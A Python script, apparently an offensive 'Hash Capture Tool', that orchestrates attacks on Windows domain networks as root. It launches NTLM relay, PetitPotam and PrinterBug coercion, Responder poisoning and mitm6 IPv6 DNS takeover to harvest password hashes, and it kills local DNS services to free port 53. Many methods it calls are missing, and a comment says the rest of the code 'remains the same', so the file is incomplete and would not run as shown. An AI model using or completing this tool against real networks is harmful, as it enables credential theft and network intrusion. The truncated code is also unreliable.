#!/usr/bin/env python3

import os
import sys
import time
import signal
import logging
import argparse
import netifaces
import ipaddress
import subprocess
import shutil
import socket
from pathlib import Path
from subprocess import Popen, PIPE, STDOUT
from threading import Thread, Event
import json
import re
from datetime import datetime

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler('hash_capture.log')
    ]
)

class HashCapture:
    def __init__(self, interface, duration=600, domain=None, creds=None, verbose=True):
        self.interface = interface
        self.duration = duration
        self.domain = domain
        self.creds = creds
        self.verbose = verbose
        self.stop_event = Event()
        self.processes = {}
        self.attack_threads = []
        self.local_ip = self.get_local_ip()
        self.original_ipv6_forward = None
        self.dc_ip = None

        # Initialize logger
        self.logger = logging.getLogger(__name__)
        
        # Set up attack loggers
        self.attack_loggers = {
            "ntlmrelay": logging.getLogger("ntlmrelay"),
            "responder": logging.getLogger("responder"),
            "mitm6": logging.getLogger("mitm6"),
            "petitpotam": logging.getLogger("petitpotam"),
            "printerbug": logging.getLogger("printerbug")
        }

        # Configure attack loggers
        for name, logger in self.attack_loggers.items():
            logger.setLevel(logging.DEBUG if verbose else logging.INFO)
            # Add console handler
            console_handler = logging.StreamHandler(sys.stdout)
            console_handler.setFormatter(logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))
            logger.addHandler(console_handler)
            # Add file handler
            file_handler = logging.FileHandler(f'{name}_attack.log')
            file_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
            logger.addHandler(file_handler)

        # Configure signal handlers
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)

    def release_dns_port(self):
        """
        Attempt to release port 53 by stopping/killing potential conflicting services
        """
        try:
            # Stop systemd-resolved
            subprocess.run(["sudo", "systemctl", "stop", "systemd-resolved"], check=False)
            
            # Kill potential DNS servers
            subprocess.run(["sudo", "killall", "-9", "named"], check=False)
            subprocess.run(["sudo", "killall", "-9", "bind9"], check=False)
            subprocess.run(["sudo", "killall", "-9", "unbound"], check=False)
            
            # Additional cleanup
            subprocess.run(["sudo", "fuser", "-k", "53/udp"], check=False)
            subprocess.run(["sudo", "fuser", "-k", "53/tcp"], check=False)
            
            self.logger.info("Successfully attempted to release DNS port 53")
        except Exception as e:
            self.logger.warning(f"Error releasing DNS port: {e}")

    def start_mitm6(self):
        """Start mitm6 attack with robust error handling and port management"""
        try:
            # Install required dependencies
            try:
                subprocess.check_call([
                    "pip", "install",
                    "--no-deps", "mitm6==0.2.2",
                    "--break-system-packages"
                ])
            except Exception as e:
                self.logger.warning(f"Could not install/downgrade mitm6: {e}")

            # Release DNS port before starting
            self.release_dns_port()

            # Prepare mitm6 command with additional safety flags
            cmd = [
                "mitm6",
                "-i", self.interface,
                "--debug",
                "--no-ra"  # Disable router advertisements
            ]
            
            # Add domain if specified
            if self.domain:
                cmd.extend(["-d", self.domain])
            
            self.logger.info(f"Starting mitm6 with command: {' '.join(cmd)}")
            
            # Set up environment to handle potential encoding issues
            env = os.environ.copy()
            env["PYTHONIOENCODING"] = "latin1"
            env["PYTHONUNBUFFERED"] = "1"
            
            # Start the process
            process = Popen(
                cmd,
                stdout=PIPE,
                stderr=STDOUT,
                universal_newlines=True,
                bufsize=1,
                env=env
            )
            self.processes["mitm6"] = process
            
            output_thread = Thread(
                target=self.process_output,
                args=(process, self.attack_loggers["mitm6"], "MITM6")
            )
            output_thread.daemon = True
            output_thread.start()
            
            return True
        except Exception as e:
            self.logger.error(f"Error in start_mitm6: {e}")
            return False

    def run(self):
        """Main execution flow running all attacks"""
        self.logger.info("Starting Hash Capture Operation")
        
        # Create targets file if domain is specified
        if not self.create_targets_file():
            self.logger.error("Failed to create targets file")
            return False

        # Setup IPv6 forwarding
        if not self.setup_ipv6_forwarding():
            self.logger.error("Failed to setup IPv6 forwarding")
            return False

        try:
            # List of attacks to run
            attacks = [
                ("NTLM Relay", self.start_ntlmrelay),
                ("PetitPotam", self.start_petitpotam),
                ("PrinterBug", self.start_printerbug)
            ]

            # Start each attack in its own thread
            for attack_name, attack_func in attacks:
                try:
                    self.logger.info(f"Launching {attack_name} attack...")
                    thread = Thread(target=attack_func)
                    thread.daemon = True
                    thread.start()
                    self.attack_threads.append(thread)
                    time.sleep(1)  # Small delay between starting attacks
                    self.logger.info(f"{attack_name} attack thread started successfully")
                except Exception as e:
                    self.logger.error(f"Failed to start {attack_name} attack: {e}")
            
            # Run Responder for the specified duration
            self.logger.info(f"Starting Responder for {self.duration} seconds...")
            responder_thread = Thread(target=self.start_responder)
            responder_thread.daemon = True
            responder_thread.start()
            time.sleep(self.duration)
            self.stop_event.set()
            responder_thread.join()
            self.stop_event.clear()

            # Wait before starting MITM6
            self.logger.info("Waiting 60 seconds before starting MITM6...")
            time.sleep(60)

            # Run MITM6 for the specified duration
            self.logger.info(f"Starting MITM6 for {self.duration} seconds...")
            mitm6_thread = Thread(target=self.start_mitm6)
            mitm6_thread.daemon = True
            mitm6_thread.start()
            time.sleep(self.duration)
            self.stop_event.set()
            mitm6_thread.join()
            self.stop_event.clear()

            self.logger.info("All attacks completed.")

            # Extract captured hashes and passwords
            self.extract_hashes()

        except KeyboardInterrupt:
            self.logger.info("Operation interrupted by user")
        except Exception as e:
            self.logger.error(f"Error in main execution: {e}")
        finally:
            self.cleanup()
        
        return True

# Rest of the existing code remains the same
def main():
    parser = argparse.ArgumentParser(description="Hash Capture Tool")
    parser.add_argument("-i", "--interface", required=True, help="Network interface to use")
    parser.add_argument("-t", "--time", type=int, default=600, help="Duration in seconds to run Responder and MITM6 (default: 600)")
    parser.add_argument("-d", "--domain", help="Domain name for attacks")
    parser.add_argument("-c", "--creds", help="Domain credentials in the format 'user:password'")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose logging")
    args = parser.parse_args()

    if os.geteuid() != 0:
        logging.error("This script must be run as root")
        sys.exit(1)

    capture = HashCapture(args.interface, args.time, args.domain, args.creds, args.verbose)
    if not capture.run():
        sys.exit(1)

if __name__ == "__main__":
    main()
